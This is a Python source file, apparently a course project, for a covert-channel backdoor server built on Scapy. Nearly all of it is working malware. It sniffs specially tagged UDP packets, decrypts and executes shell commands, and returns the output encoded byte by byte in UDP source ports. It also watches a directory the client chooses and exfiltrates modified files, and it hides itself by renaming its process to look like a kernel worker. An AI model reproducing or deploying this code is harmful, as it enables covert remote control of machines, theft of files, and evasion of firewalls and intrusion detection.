##################################################################################
##  SOURCE FILE:    Server.py
##
##  AUTHOR:         Geoff Dabu
##                  Ben Kim
##
##  PROGRAM:        Backdoor program which receives commands, executes them and
##                  returns the output to the client. Also it returns contents of
##                  modified file that a client specified. The communication between
##                  client and itself should not be noticible in its firewall or IDS.
##                  Another words, the application is using a covert channel.
##                  The process title is also changed to disguise itself.
##
##  FUNCTIONS:      executeShellCommand(string)
##                  parsePacket(packet)
##                  main()
##
##  DATE:           November 17, 2015
##
##################################################################################
import sys, os, argparse, socket, subprocess, logging, time, subprocess, setproctitle, threading, pyinotify, string
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from AesEncryption import *


# global variables
wm = pyinotify.WatchManager()
mask = pyinotify.IN_CLOSE_WRITE | pyinotify.IN_CREATE

##################################################################################
##  CLASS
##
##  Name:           EventHandler
##  Parameters:     pyinotify.ProcessEvent
##  Description:    Whenever a file is modified in a specified directory that
##                  client set, the system will notify and handle the event.
##################################################################################
class EventHandler(pyinotify.ProcessEvent):

    # initialization
    def __init__(self, receivedPacket):
        self.pkt = receivedPacket

    # when a specified file is created
    def process_IN_CREATE(self, event):
        print "new creation"

    # when a specified file is modified
    def process_IN_CLOSE_WRITE(self, event):
        filepath = event.pathname
        filename = event.name
        byteCounter = 0
        print "file", filename, "modified"
        print "***", event.pathname
        print filepath

        # when file saves, it could generate temporary file,
        # so make sure it does not crash for this reason
        if ("/." in filepath) or ("~" in filepath):
            print "temporary file created.", filename
        else:
            # open a modified file
            secretFile = open(filepath, 'rb')
            # encrypt and put into byte array
            data_byte_array = bytearray(encrypt(secretFile.read()))
            print data_byte_array

            # for each byte we send to the client
            # a byte is stored in source port
            for b in data_byte_array:
                print b
                byteCounter += 1
                send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src, id=7777)/UDP(dport=7000, sport=int(b)))
                print `byteCounter` + " \ " + `len(data_byte_array)`
                time.sleep(0.1)

            # send the finalize packet (source port 128) with filename
            send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src, id=7777)/UDP(dport=7000, sport=128)/encrypt(filename))


##################################################################################
##  FUNCTION
##
##  Name:           watch_file
##  Parameters:     directory - a directory to watch
##                  receivedPacket - received packet from a client
##  Return Values:  n/a
##  Description:    Once a new file watching thread starts, it instantiates a
##                  handler to watch a specific directory.
##################################################################################
def watch_file(directory, receivedPacket):
    handler = EventHandler(receivedPacket)
    notifier = pyinotify.Notifier(wm, handler)
    wdd = wm.add_watch(directory, mask, rec=True)
    notifier.loop()


##################################################################################
##  FUNCTION
##
##  Name:           executeShellCommand
##  Parameters:     command - a shell command
##  Return Values:  outputString - the output of the shell command
##  Description:    executes a shell command and returns the output
##################################################################################
def executeShellCommand(command):

    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
    return outputString

##################################################################################
##  FUNCTION
##
##  Name:           parsePacket
##  Parameters:     receivedPacket - a packet which is passed in through sniff()
##  Return Values:  n/a
##  Description:    receives a packet, if dport is 22, we handle watching directory
##                  if dport is 80, we handle command exeception,
##                  decrypts the payload for a command,
##                  runs the command, and sends back a packet with a decrypted
##                  output result.
##################################################################################
def parsePacket(receivedPacket):

    if ARP in receivedPacket:
        return
    elif DNS in receivedPacket:
        return
    elif DHCP in receivedPacket:
        return

    if receivedPacket.haslayer(IP):
        if receivedPacket['IP'].id != 7777:
            return

    if UDP in receivedPacket:

        # handling watch directory
        if receivedPacket['UDP'].dport == 22:
            # decrypt the filepath
            directory = decrypt(receivedPacket['Raw'].load)
            print "Watching: ", directory
            # start threading
            t = threading.Thread(name="watchfile_threading", target=watch_file, args=[directory, receivedPacket])
            t.start()

        # handling command execution
        elif receivedPacket["UDP"].dport == 80:

            # decrypt the command input
            command = decrypt(receivedPacket['Raw'].load)

            print "Excuting: " + command
            # execute to get command result and save it to output
            output = executeShellCommand(command)
            print output
            # encrypt the result
            output = encrypt(output)
            print output


            output_dec = [ord(ch) for ch in output]
            print len(output_dec)
            print output_dec
            # total = len(output_dec)

            for srcport in output_dec:
                # print "%d/%d" % i, total
                returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src, id=7777)/UDP(dport=receivedPacket['UDP'].sport,sport=srcport)/encrypt(output)
                # send packet to client
                send(returnPacket)
                

            returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src, id=7777)/UDP(dport=receivedPacket['UDP'].sport,sport=128)/encrypt(output)
            send(returnPacket)

##################################################################################
##  FUNCTION
##
##  Name:           main
##  Parameters:     n/a
##  Return Values:  n/a
##  Description:    Changes the process name of this program, and listens for
##                  packets that are directed to specific ports.
##################################################################################
def main():

    setproctitle.setproctitle("[kworker2:2]")
    sniff(filter="udp and (dst port 80 or dst port 22) and (src port 8000)", prn=parsePacket)

if __name__ == '__main__':
    main()
